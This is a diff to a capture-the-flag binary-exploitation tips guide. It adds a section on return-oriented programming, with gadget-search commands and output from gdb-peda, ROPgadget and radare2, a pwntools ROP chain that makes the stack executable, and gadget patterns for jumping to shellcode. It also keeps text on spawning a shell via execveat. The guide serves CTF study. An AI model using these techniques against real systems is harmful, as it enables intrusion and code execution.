@@ -17,7 +17,7 @@ CTF-pwn-tips
 * [Hijack hook function](#hijack-hook-function)
 * [Use printf to trigger malloc and free](#use-printf-to-trigger-malloc-and-free)
 * [Use execveat to open a shell](#use-execveat-to-open-a-shell)
-
+* [Tips on ROP](#tips-on-rop)
 
 ## Overflow
 
@@ -137,13 +137,13 @@ $9 = 0x7fffffffde38
 * Then use `searchmem $result_address`
 
 ```
-gdb-peda$ searchmem "/home/naetw/CTF/seccon2016/check/checker"
+$ searchmem "/home/naetw/CTF/seccon2016/check/checker"
 Searching for '/home/naetw/CTF/seccon2016/check/checker' in: None ranges
 Found 3 results, display max 3 items:
 [stack] : 0x7fffffffe1cd ("/home/naetw/CTF/seccon2016/check/checker")
 [stack] : 0x7fffffffed7c ("/home/naetw/CTF/seccon2016/check/checker")
 [stack] : 0x7fffffffefcf ("/home/naetw/CTF/seccon2016/check/checker")
-gdb-peda$ searchmem 0x7fffffffe1cd
+$ searchmem 0x7fffffffe1cd
 Searching for '0x7fffffffe1cd' in: None ranges
 Found 2 results, display max 2 items:
    libc : 0x7ffff7dd33b8 --> 0x7fffffffe1cd ("/home/naetw/CTF/seccon2016/check/checker")
@@ -456,9 +456,8 @@ We have to make sure that:
 
 More details:
 
-* [__builtin_expect](https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html)
-* [THREAD_GETMEM](https://code.woboq.org/userspace/glibc/sysdeps/x86_64/nptl/tls.h.html#_M/THREAD_GETMEM)
-
+- [\_\_builtin_expect](https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html)
+- [THREAD_GETMEM](https://code.woboq.org/userspace/glibc/sysdeps/x86_64/nptl/tls.h.html#_M/THREAD_GETMEM)
 
 ### conclusion
 
@@ -467,7 +466,7 @@ More details:
 
 ## Use execveat to open a shell
 
-When it comes to opening a shell with system call, `execve` always pops up in mind. However, it's not always easily available due to the lack of gadgets or others constraints.  
+When it comes to opening a shell with system call, `execve` always pops up in mind. However, it's not always easily available due to the lack of gadgets or others constraints.
 Actually, there is a system call, `execveat`, with following prototype:
 
 ```c
@@ -481,3 +480,108 @@ According to its [man page](http://man7.org/linux/man-pages/man2/execveat.2.html
 > If pathname is absolute, then dirfd is ignored.
 
 Hence, if we make `pathname` point to `"/bin/sh"`, and set `argv`, `envp` and `flags` to 0, we can still get a shell whatever the value of `dirfd`.
+
+## Tips on ROP
+
+### Tools
+
+Use RopGadget from pip, gdb-peda or radare2 will be useful tools.
+
+**gdb-peda**: Use ropgadget or ropsearch. Example:
+
+```sh
+$ ropgadget
+ret = 0x804841a
+popret = 0x8048431
+pop2ret = 0x8048f1a
+pop3ret = 0x8048f19
+pop4ret = 0x8048f18
+addesp_12 = 0x804842e
+addesp_16 = 0x8048565
+$ ropgadget libc
+ret = 0xf7dd0417
+addesp_4 = 0xf7dea2fb
+popret = 0xf7dd1aae
+pop2ret = 0xf7de869a
+pop3ret = 0xf7de8699
+pop4ret = 0xf7de87e9
+addesp_8 = 0xf7dfc335
+addesp_12 = 0xf7de9118
+$ ropsearch "pop ebx; ret" binary
+Searching for ROP gadget: 'pop ebx; ret' in: binary ranges
+0x08048431 : (b'5bc3')  pop ebx; ret
+$ ropsearch "pop edx; ret" libc
+Searching for ROP gadget: 'pop edx; ret' in: libc ranges
+0xf7dd1aae : (b'5ac3')  pop edx; ret
+$ ropsearch "add esp, ?" binary
+Searching for ROP gadget: 'add esp, ?' in: binary ranges
+0x0804842e : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
+0x08048565 : (b'83c410c9f3')    add esp,0x10; leave; repz ret
+$ asmsearch "pop ? ; ret"
+0x080482f5 : (5bc3) pop    ebx; ret
+0x080484cf : (5dc3) pop    ebp; ret
+0x080484f6 : (5bc3) pop    ebx; ret
+```
+
+**RopGadget**: More should for static binary
+
+```sh
+% ROPgadget --binary activate --ropchain
+Gadgets information
+============================================================
+0x080493dd : adc al, 0x41 ; ret
+0x080485ee : adc al, 0x50 ; call edx
+0x0804855d : adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+```
+
+**Radare2**: Current implementation for ROP searching is quite slow
+             (commit b7a9dd64e4a3442335d7422b73e09f6cc8b00e86).
+
+```sh
+[0x08048500]> e search.in=io.maps.rx
+[0x08048500]> e rop.len=2
+[0x08048500]> "/R/l pop ?;ret"
+0x08048431: pop ebx; ret;
+0x08048f1b: pop ebp; ret;
+0x08048f36: pop ebx; ret;
+0x08048431: pop ebx; ret;
+0x08048f1b: pop ebp; ret;
+0x08048f36: pop ebx; ret;
+```
+
+### Tips
+
+#### Static binaries
+
+In static build binaries often have `_dl_make_stack_executable` function which
+is a wrapper to `mprotect` system call to make stack executable again.
+Usually, you might end up to exploit like this:
+
+```py
+from pwn import ROP, constants
+MEM_PROT_FLAG = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
+rop = ROP(elf)
+rop.raw(POP_EDX_RET)
+rop.raw(addr___stack_prot)          # edx = &__stack_prot
+rop.raw(XOR_EAX_EAX_RET)
+
+for x in range(MEM_PROT_FLAG):      # eax = MEM_PROT_FLAG
+    rop.raw(INC_EAX_RET)
+
+rop.raw(MOV_DWORD_EDX_EAX_RET)      # __stack_prot = MEM_PROT_FLAG
+rop.raw(POP_EAX_RET)                #
+rop.raw(addr___libc_stack_end)      # eax = &__libc_stack_end
+rop.call('_dl_make_stack_executable') # _dl_make_stack_executable(&__libc_stack_end)
+rop.raw(PUSH_ESP_RET)
+```
+
+If you want jump back to stack where shellcode is, try to find these pattern:
+
+- pop esp; ret
+- call esp
+- mov eax, esp; call eax
+- jmp esp
